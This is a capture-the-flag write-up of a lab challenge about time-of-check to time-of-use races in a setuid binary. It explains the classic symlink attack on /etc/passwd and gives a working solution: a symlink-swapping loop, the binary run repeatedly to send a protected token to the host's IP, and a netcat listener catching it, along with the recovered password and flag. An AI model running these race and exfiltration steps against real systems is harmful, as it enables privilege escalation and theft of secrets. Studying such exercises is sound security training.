# Level10

## Time-of-check to time-of-use

*In software development, time-of-check to time-of-use (TOCTOU, TOCTTOU or TOC/TOU) is a class of software bugs caused by a race condition involving the checking of the state of a part of a system (such as a security credential) and the use of the results of that check.*

*Real UserID:
The Real UserId is the UserID of its user who initiated the operation. It specifies which documents are accessible to this operation. It is the person who owns the operation.*

*Effective UserID:
The Effective UserID is identical to the Real UserID, but it could be modified to permit a non-privileged person to use the documents that are typically accessible only to privileged users such as the root. It is used by the computing system to determine if you are allowed to do a particular task or not.*
## An Example of this bug:
In Unix, the following C code, when used in a setuid program, has a TOCTOU bug:
```c
if (access("file", W_OK) != 0) {
    exit(1);
}
fd = open("file", O_WRONLY);
write(fd, buffer, sizeof(buffer));
```
Here, access is intended to check whether the real user who executed the setuid program would normally be allowed to write the file (i.e., access checks the real userid rather than effective userid).
This race condition is vulnerable to an attack:
*Victim*:
```c
if (access("file", W_OK) != 0) {
    exit(1);
}

fd = open("file", O_WRONLY);
// Actually writing over /etc/passwd
write(fd, buffer, sizeof(buffer));
```
*Attacker*:
```c
// After the access check
symlink("/etc/passwd", "file");
// Before the open, "file" points to the password database
```
*In this example, an attacker can exploit the race condition between the access and open to trick the setuid victim into overwriting an entry in the system password database. TOCTOU races can be used for privilege escalation to get administrative access to a machine.*
In our case we are going to use this method to read the file `token` 
```bash
ls -la
# Output
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```
echo hello > /tmp/test

# On the host
ip_addr=`ifconfig en0 | egrep  "inet [0-9]+\." | awk -F' ' '{print $2}'`

# On the vm
ltrace ./level10 /tmp/test $ip_addr

# Solution
```bash
while :; do ln -sf /tmp/token /tmp/token10; ln -sf /home/user/level10/token /tmp/token10; done

 while :; do nice -n 20 /home/user/level10/level10 /tmp/token10 $ip_addr; done
```
*On host do this*
```bash
while true; do nc -l 6969 >> token; done
# Output
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
```

```bash
su flag10
# passowrd: woupa2yuojeeaaed06riuj63c
getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
